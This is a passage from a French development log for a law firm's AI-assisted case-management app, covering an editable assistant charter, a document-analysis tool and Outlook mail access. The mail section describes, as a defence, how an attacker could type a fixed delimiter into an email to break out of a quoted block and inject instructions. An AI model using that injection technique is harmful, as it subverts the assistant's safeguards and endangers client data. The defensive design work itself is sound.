(`pause`/`resume` de la file), run planifié bout-en-bout, **saisie via l'UI des 2 skills et des 3 tâches planifiées (D7)**, un « Verser en Word » ouvert dans Word sans réparation ; (9) runbook d'effacement Loi 25 : DEPLOYMENT.md §15 (hors application, par conception).

### La charte éditable — socle figé, corps versionné (2026-08-27, ✅ code complete)

- **Contexte.** `chat/charter.py` portait la charte ENTIÈRE sous contrôle de source,
  et sa docstring défendait ce choix. Décision du praticien : le corps et l'addendum
  planifié deviennent éditables dans l'application. Ce qu'on perd est nommé : la
  charte était l'un des TROIS seuls freins entre une exécution planifiée sans
  surveillance et la parité d'écriture complète (avec les clés d'idempotence forcées
  et `GATED_TOOLS`, vide en v1).
- **Le SOCLE est ce qui rend la perte supportable** (décision, même jour) : identité,
  devoirs épistémiques, données privilégiées et absence de suppression restent sous
  revue de code et précèdent toute version enregistrée. Un lapsus à l'écran ne peut
  donc ni effacer une règle déontologique, ni briquer le clavardage. `SOCLE ∪
  SEED_CORPS` porte exactement les lignes de `BASE_CHARTER`, épinglé par test.
- **Sept lots**, chacun livrable seul. Le **lot 0** répare trois défauts LATENTS avant
  que la charte ne varie : la garde d'estampille branchée sur `skill_versions` (qui ne
  gardait rien sans compétence), l'absence de repli mémoire de `charter_version` dans
  la provenance des brouillons, et l'ordre dans `_advance` (la résolution passe
  au-dessus des outils approuvés, sans quoi un retryable les rejouerait). Puis le
  modèle + le dispositif de fichiers partagé, l'assemblage + le socle, la résolution
  par tour + le repli bruyant, les fichiers de la charte, l'écran, la symétrie des
  compétences, la documentation.
- **Six pièges trouvés en revue de conception, tous corrigés** : la charte vide qui
  brique tout ; l'ambiguïté à trois voies de `charter_version == 1` ; la chaîne née en
  repli condamnée au pas 2 ; le retryable qui rejouerait des écritures ; la garde
  d'estampille inopérante ; et l'arithmétique du plafond de 1 Mo, fausse dans le code
  existant (« ~816 Ko pessimiste » était un chiffre ×3 sous un en-tête ×6 ; le vrai ×6
  fait 1,55 Mio et dépasse le plafond) — d'où le passage des DEUX formulaires
  versionnés en `multipart/form-data`.
- **Zéro classe Tailwind inédite** (vérifié contre le corpus des gabarits) donc aucune
  recompilation ; icône `lock` déjà vendorisée donc aucune régénération de police ;
  zéro index, zéro dépendance ; MCP, DAV et gabarits intouchés. 2 953 → 3 000 tests.
- **Exploitation** : rien à provisionner. Tant qu'aucune version n'est enregistrée, le
  texte source gouverne et les tours portent `charter_version: 1` /
  `charter_source: "amorcage"` — ce n'est **pas** une anomalie. Poser une alerte
  log-based sur `chat_charter_repli`.
### Analyse documentaire persistée (2026-08-27, ✅ code complete)

La moitié manquante de `SPEC_PHASE_K_ANALYSE_DOCUMENTAIRE.md`. Sa moitié PURE existait déjà, complète et testée — `utils/analyse_taxonomies.py` (42 sous-natures, familles, privilèges, `nature_of`/`famille_of`/`validate_pair`) et `utils/analyse_protection.py` (`niveau_protection`, `champs_attendus_absents`, `appliquer_regime` et les deux alertes) —, avec le script `scripts/exporter_competence_analyse.py` qui GÉNÈRE la compétence de clavardage depuis ces tables. Manquaient la persistance §8, l'outil §9.2 et l'écran §9.1 : **le modèle pouvait lire un document, il ne pouvait rien écrire dessus** (`update_metadata` n'avait aucun appelant hors du formulaire web), si bien que l'analyse mourait avec la conversation — l'écart signalé par le praticien.

**Livré** : le champ `analyse` + la sous-collection `analyses` write-once (`record_analyse`, `confirmer_analyse`, `list_analyses`); l'outil **`record_document_analysis`** (52 → 53), enums DÉRIVÉS du module pur, membre de `WRITE_TOOLS` **et** d'`EDIT_TOOLS` (donc `destructiveHint`), dont le gestionnaire rejoue chaque garde du modèle (écrit pour la branche sèche, retirée le même jour — la discipline, elle, reste : un refus qui nomme le champ) ; et l'écran — régime de protection **en tête**, les quatre alertes affichées et non repliées, mention « Présumée », pastille dans l'explorateur, `POST /documents/<id>/analyse/confirmer`.

**Écart assumé avec la §9.2** : elle décrivait un `analyser_document` qui ENFILE et rend « en_attente ». Le clavardage (Phase N) n'existait pas quand la spec a été écrite; il fait l'analyse lui-même, donc l'outil ENREGISTRE, synchrone. Le champ garde son `statut` pour qu'un pipeline asynchrone s'y branche sans migration (décision « les deux hôtes, le clavardage d'abord »). **Zéro dépendance, zéro index, zéro recompilation Tailwind** — un test croise les classes du rendu avec l'artefact compilé, et il a immédiatement attrapé `gap-x-6`, `gap-y-3` et `hover:bg-gray-700`, absents.

**Ops** : le nouvel outil est une ÉCRITURE, donc il paraît au connecteur dès le déploiement sous un écran de consentement qui ne le mentionne pas — train habituel : `python -m scripts.revoke_mcp_tokens`, déployer, re-consentir. Puis recoller la compétence « Analyse documentaire » (`python -m scripts.exporter_competence_analyse`), dont le corps disait encore que tout reste dans la conversation.

### Messagerie Outlook pour l'assistant — lecture, pièces jointes, brouillons (2026-08-28, ✅ code complete — **infrastructure pending**)

- **Contexte.** L'assistant lisait les dossiers, les documents, le temps, les factures et le fidéicommis, mais pas la CORRESPONDANCE — or dans un cabinet de litige le fil de courriels *est* une bonne part du dossier : ce que la partie adverse s'est engagée à faire, quand un délai a commencé à courir, ce que le client a été informé. Ce lot ouvre la boîte du juriste à l'assistant, en lecture, et lui laisse DÉPOSER des brouillons — jamais en envoyer un.
- **Neuf décisions du praticien**, arrêtées avant toute ligne : (D1) exposition **chat seulement** — les noms n'entrent jamais dans `mcp.tools.TOOLS`, et `mcp/endpoint.py` dérivant `tools/list` ET `tools/call` de ce dict, l'isolement est structurel (le mécanisme des Workers), pas un drapeau ; (D2) **une seule boîte**, celle du juriste ; (D3) réponse / répondre-à-tous / transfert / lettre neuve, **jamais d'envoi** ; (D4) texte des pièces jointes **et** versement au dossier ; (D5) **aucune autorisation** avant de déposer un brouillon — donc l'idempotence devient obligatoire, pas facultative ; (D6) le versement écrit le **`.eml` ET** les pièces choisies ; (D7) l'enveloppe de provenance et `GATED_TOOLS` passent **AVANT** tout code de messagerie ; (D8) le versement fait franchir au courriel la frontière vers le corpus lisible depuis claude.ai — **assumé** ; (D9) `web_search` gagne un coupe-circuit et disparaît des tours planifiés.
- **Lot 0 — le prérequis.** Il ferme H-1 de l'audit du 2026-08-26 (CONFIRMÉ, non corrigé) plutôt que de seulement rendre la messagerie possible : une **enveloppe de provenance** posée au SEUL joint par lequel tout exécuteur passe (la note de clôture de l'audit est la règle de conception — « un seul chemin non couvert défait tout le contrôle »), avec un **nonce par appel**, faute de quoi le délimiteur est une chaîne fixe qu'un attaquant tape dans son propre courriel pour refermer le bloc et continuer dehors ; `GATED_TOOLS` **peuplé par DÉRIVATION** (`EDIT_TOOLS` + `import_invoice`), comme l'audit le recommandait — et il fallait bien le peupler, la seconde parade qu'il proposait (`dry_run` forcé) ayant été retirée du protocole le lendemain de sa rédaction ; `CHAT_WEB_SEARCH_ENABLED`, éteint sans condition sur un tour non surveillé, plus une ligne `chat_web_search` qui journalise la LONGUEUR et une empreinte, jamais la requête (elle est composée par le modèle et peut porter un nom de client, que le filtre de rédaction ne nettoie pas).
- **Lot 1 — le transport.** Trois verbes ADDITIFS sur `utils/graph.py` — `graph_get_page` (UNE page, `@odata.nextLink` intact), `graph_get_bytes` (flux borné, `with response:` pour ne pas fuir une connexion sur le refus) et `graph_send` (statut rendu) — les quatre d'origine restant **littéralement inchangés**, un test épinglant qu'ils n'envoient toujours aucun en-tête ni `stream`. `GraphError` porte désormais `status`/`retry_after_s`, additivement. Nouveau module **`utils/graph_messagerie.py`** (pur, sans Firestore, comme ses deux frères `graph_calendrier`/`graph_miroir`) et namespace de configuration `CHAT_MAIL_*` avec `Config.chat_mail_configured()`, `CHAT_MAIL_UPN` posé dans **`chat.yaml` seulement** — la règle chat-only tenue par la configuration autant que par le placement.
- **Lot 2 — la lecture.** Quatre outils (`mail_search`, `mail_read_thread`, `mail_read_message`, `mail_read_attachment`), un nouveau genre d'exécuteur, et l'**UNION** dossier → adresses + jetons d'identité qui est la correction la plus importante du lot : un intersect rendait zéro ligne dès qu'une partie écrivait d'une adresse absente du dossier — le cas COURANT — et zéro ligne se lit « ce dossier n'a aucune correspondance ». Corps en TEXTE (`Prefer: outlook.body-content-type`), `uniqueBody` pour les fils, curseur de fil qui est une POSITION et non un `nextLink`, chemin de dossier paresseux, exclusion par défaut de la Corbeille ET du courrier sortant de l'application.
- **Lot 3 — les écritures.** `mail_draft` (un schéma, quatre modes) et `mail_file_to_dossier` (le `.eml` + les pièces nommées, via `upload_document`, provenance en champs DÉDIÉS). Marqueur de brouillon en propriété étendue sous un GUID GELÉ (le motif `graph_miroir`) + la catégorie visible « Pallas Athéna », clé incluant `tool_use_id`, vérification préalable triée par `createdDateTime desc` et en échec OUVERT.
- **Zéro dépendance nouvelle** (le texte d'un courriel imbriqué passe par le module `email` de la stdlib), **zéro index composite**, **zéro classe Tailwind**, **aucune régénération d'icône**, **aucun changement de `cron.yaml`**, **aucun re-consentement MCP** (`len(mcp.tools.TOOLS) == 53` reste épinglé dans deux fichiers). 3 064 → 3 185 tests (+121), dont 21 issus des DEUX revues adverses du même jour (voir les Known Gotchas : l'identifiant de message effacé par `sanitize`, l'URL absolue qui emportait le jeton Graph, la troncature annoncée comme complétude, la promesse « ne lève jamais » qui était fausse, et un plafond que personne ne lisait).
- **Prérequis d'exploitation, ordonnés :** (1) **topologie CONFIRMÉE le 2026-08-28 : `reception@` est un ALIAS de `jason@`, une seule boîte.** D'où : une seule portée Exchange, et le test négatif se fait contre une TROISIÈME boîte sans rapport — lire `reception@` RÉUSSIT, et le prendre pour un échec de portée enverrait chercher un contrôle qui fonctionne ; (2) ⚠ **NE PAS accorder `Mail.ReadWrite` dans Entra** — les deux autorités s'additionnent et le grant d'organisation annulerait la portée (voir le Known Gotcha) ; cette permission s'accorde UNIQUEMENT à l'étape 3 ; (3) **RBAC for Applications** (PAS `New-ApplicationAccessPolicy`, hérité) : UNE portée de ressource sur cette unique boîte, couvrant `Mail.Send`, `Mail.ReadWrite` et `Calendars.ReadWrite` ensemble ; test négatif contre une boîte TIERCE — ⚠ **impossible ici : le locataire ne compte qu'UNE boîte** (confirmé 2026-08-28), donc rien à exclure. Ce qui reste vérifiable est le FILTRE (`Get-Recipient -RecipientPreviewFilter`), qui doit résoudre vers exactement ce destinataire. Conséquence à assumer : aujourd'hui la portée et un grant Entra sont **équivalents en effet** ; elle prend sa valeur le jour où une deuxième boîte est créée, qui en sera exclue d'office alors qu'un grant Entra l'aurait incluse en silence. C'est aussi pourquoi on la pose MAINTENANT : y passer plus tard obligerait à retirer d'Entra une permission vivante sur un système qui tourne. ⚠ Conséquence assumée de l'alias : `Mail.ReadWrite` couvre aussi le courrier sortant du portail — aucun code ne s'en sert, le balayage « aucun verbe d'envoi ni de suppression » l'épingle, mais la PERMISSION est plus large que le code ; (3 bis) relever `Get-OrganizationConfig | fl SendFromAliasEnabled` — il décide si une invitation du portail revient estampillée `reception@` ou `jason@`, donc si l'exclusion par expéditeur mord ; le contrôle qui compte (le retrait du lien de connexion) ne dépend PAS de ce réglage, mais son résultat explique le compteur `app_sent_excluded_best_effort` ; (4) sonder l'existence d'une **archive en ligne** (`GET /users/{upn}/messages` ne l'atteint pas ; s'il y en a une, le remède est l'honnêteté dans l'enveloppe, pas du code) ; (5) `chat.yaml` : `CHAT_MAIL_UPN` + `CHAT_MAIL_ENABLED` — **aucun secret nouveau, aucune IAM nouvelle**, les quatre `GRAPH_*` y sont déjà et le service tourne sous le SA par défaut, qui a déjà `secretAccessor` sur `graph-client-secret` ; (6) déployer le lot 0, puis 1-3 ; (7) fumée : une recherche par dossier qui trouve un fil via un jeton d'identité, un fil lu jusqu'au bout par-delà le plafond, un PDF numérisé refusé honnêtement, un `.eml` versé qui s'ouvre dans Outlook, un brouillon déposé puis envoyé à la main, `CHAT_WRITE_ENABLED=false` refusant les deux écritures sans un seul appel Graph, et `gcloud tasks queues pause chat-turns` comme bris de glace.
